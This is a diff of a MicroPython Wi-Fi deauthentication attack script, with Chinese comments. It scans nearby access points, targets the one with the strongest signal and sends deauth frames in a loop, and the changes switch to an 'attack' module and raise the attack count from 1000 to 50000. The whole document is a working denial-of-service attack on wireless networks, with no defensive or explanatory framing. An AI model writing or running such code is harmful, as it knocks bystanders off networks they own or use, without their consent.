@@ -2,12 +2,18 @@
 import network
 import time
 import uos
+import wireless
 
-sta_if=network.WLAN(0)#0：STA 模式 1：AP模式
-sta_if.quitAttack()
+
+
+# sta_if=network.WLAN(0)#0：STA 模式 1：AP模式
+# sta_if.active(True)
+# ap_list=sta_if.scan()
+
+sta_if=wireless.attack(0)#0：STA 模式 1：AP模式
 sta_if.active(True)
 ap_list=sta_if.scan()
-#print(ap_list)
+print(ap_list)
 ssid=''
 bssid=''#bssid:AP MAC address
 channel=''#信道
@@ -56,6 +62,7 @@ if __name__=="__main__":
     max_rssid=0
     max_id=0
     num=0
+
     #获取信号最强的AP 进行攻击
     for i in ap_list:
         if max_rssid==0:
@@ -70,7 +77,9 @@ if __name__=="__main__":
     channel=ap_list[max_id][2]
     print('ssid:',ssid,'-bssid:',bssid)
     print('-channel:',channel,'-rssid:',max_rssid)
-    sendNum=1000#攻击次数
+    sendNum=50000#攻击次数
+   
+    print('******************************')
     if sta_if.setAttack(channel):
         print('Set Attack OK')
         time.sleep_ms(100)
@@ -85,4 +94,4 @@ if __name__=="__main__":
                 time.sleep_ms(5)
             else:
                 print('---deauth fail-------')
-            time.sleep_ms(1)
+            time.sleep_ms(5000)
